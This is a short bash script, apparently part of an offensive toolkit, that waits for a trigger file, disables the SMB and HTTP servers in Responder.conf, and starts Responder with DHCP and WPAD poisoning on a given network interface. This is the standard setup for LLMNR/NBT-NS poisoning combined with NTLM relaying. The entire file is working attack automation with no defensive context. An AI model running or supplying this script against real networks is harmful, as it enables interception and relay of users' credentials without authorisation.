#!/usr/bin/env bash

LBlue='\033[0;94m'      # Ligth Blue
BRed='\033[1;31m'       # Bold Red
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

while [[ ! -f .attack ]];do
    clear
    echo -e " ${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Responder...${Color_Off}\n"
    sleep 5
done

IFACE=$(cat iface.txt)

# Modificando parametros de Responder.conf
if [ -f /usr/share/responder/Responder.conf ]; then
    sed -i 's/SMB      = On/SMB      = Off/g' /usr/share/responder/Responder.conf
    sed -i 's/HTTP     = On/HTTP     = Off/g' /usr/share/responder/Responder.conf
    echo -e " ${LBlue}[${BBlue}+${LBlue}] ${BWhite}Configuring Responder.conf${Color_Off}"
else
    echo -e " ${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error configuring Responder.conf${Color_Off}"
    exit 1
fi

# Iniciar Responder con verificación
responder -I "$IFACE" -dw || {
    echo -e " ${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error starting Responder${Color_Off}"
    exit 1
}

sleep 5